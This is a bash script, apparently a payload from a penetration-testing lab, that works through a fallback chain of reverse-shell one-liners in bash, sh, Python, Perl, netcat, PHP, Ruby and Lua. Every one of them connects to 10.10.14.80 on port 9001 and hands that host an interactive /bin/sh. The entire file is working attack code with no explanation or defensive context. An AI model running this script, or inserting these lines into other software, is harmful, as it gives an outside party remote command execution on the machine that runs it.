#! /usr/bin/env bash

if command -v bash > /dev/null 2>&1; then
    bash -i >& /dev/tcp/10.10.14.80/9001 0>&1
    exit;
fi

if command -v bash > /dev/null 2>&1; then
    bash -c 'bash -i >& /dev/tcp/10.10.14.80/9001 0>&1'
    exit;
fi

if command -v sh > /dev/null 2>&1; then
    sh -i >& /dev/tcp/10.10.14.80/9001 0>&1
    exit;
fi

if command -v sh > /dev/null 2>&1; then
    sh -c 'sh -i >& /dev/tcp/10.10.14.80/9001 0>&1'
    exit;
fi

if command -v python > /dev/null 2>&1; then
    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.80",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
    exit;
fi

if command -v python3 > /dev/null 2>&1; then
    python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.80",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
    exit;
fi

if command -v perl > /dev/null 2>&1; then
    perl -e 'use Socket;$i="10.10.14.80";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    exit;
fi

if command -v nc > /dev/null 2>&1; then
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.80 9001 >/tmp/f
    exit;
fi

if command -v php > /dev/null 2>&1; then
    php -r '$sock=fsockopen("10.10.14.80",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
    exit;
fi

if command -v ruby > /dev/null 2>&1; then
    ruby -rsocket -e'f=TCPSocket.open("10.10.14.80",9001).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    exit;
fi

if command -v lua > /dev/null 2>&1; then
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.80','9001');os.execute('/bin/sh -i <&3 >&3 2>&3');"
    exit;
fi 